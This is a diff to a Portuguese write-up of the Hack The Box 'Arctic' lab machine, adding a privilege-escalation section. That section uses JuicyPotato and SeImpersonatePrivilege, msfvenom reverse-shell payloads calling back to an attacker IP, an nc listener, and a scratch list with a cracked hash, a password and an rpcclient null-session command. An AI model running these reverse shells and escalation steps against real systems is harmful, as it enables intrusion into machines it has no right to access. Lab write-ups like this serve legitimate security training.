@@ -208,3 +208,50 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.11
 ```
 
+## GET SYSTEM
+
+Conforme tinhamos verificado que estava habilitado o **SeImpersonatePrivilege        Impersonate a client after authentication Enabled** entao vou escalar usando metodo https://github.com/ohpe/juicy-potato
+
+Primeiro gerei meu payload de 64bits de acordo com nosso alvo
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe`
+
+Em seguida transferir o exploit e meu reverse.exe  para  maquina alvo
+
+Depois disso eh necessario o **CLSID** de acordo com o sistem operacional do alvo, no nosso caso eh um **Microsoft Windows Server 2008 R2 Standard** entao vai nesse link https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
+
+Apos ter feito toda essas etapas, podemos iniciar nosso listen na porta escolhida na criacao do payload e executar o exploit
+
+```
+root@kali:~/HTB-Windows/arctic# rlwrap nc -nlvp 53
+listening on [any] 53 ...
+```
+
+Execute
+
+`.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\reverse.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`
+
+![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-arctic/9.jpg)
+
+## Rascunho
+
+```
+http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/
+
+
+2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+
+happyday
+
+
+rpcclient -U "" 192.168.0.1
+
+
+ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f raw > shell.jsp
+
+
+.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\reverse.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=53 -f exe -o reverse.exe
+```
